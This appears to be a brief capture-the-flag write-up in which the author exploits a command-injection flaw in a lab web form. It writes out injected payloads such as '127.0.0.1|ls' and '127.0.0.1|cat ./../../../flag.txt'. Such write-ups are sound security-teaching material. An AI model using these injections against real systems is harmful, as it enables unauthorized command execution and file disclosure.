## The Security Guard

Task: Once in a remote Norwegian town, a group of skilled security professionals had convened in a fancy cabin to collaborate and achieve their objectives. On their network, they found a number of challenges that required their collective expertise. Do you have what it takes to tackle these challenges too?

The websites looks just like the first one:
![6a74c602eb7c49459393df7c63ff38ec.png](../images/6a74c602eb7c49459393df7c63ff38ec.png)

I can also list files with `ip=127.0.0.1|ls`
![1dec5d89f8df43f79d842c398a3be5cb.png](../images/1dec5d89f8df43f79d842c398a3be5cb.png)

This time the flag is not there.
So I have to navigate with several `../../` until I reach the flag.
![b0914c27353c49f1ab8f36dd3d6e8c12.png](../images/b0914c27353c49f1ab8f36dd3d6e8c12.png)

The final payload is `127.0.0.1|cat ./../../../flag.txt`
![244701f39a1146cfbac94b1f1d95ce5d.png](../images/244701f39a1146cfbac94b1f1d95ce5d.png)
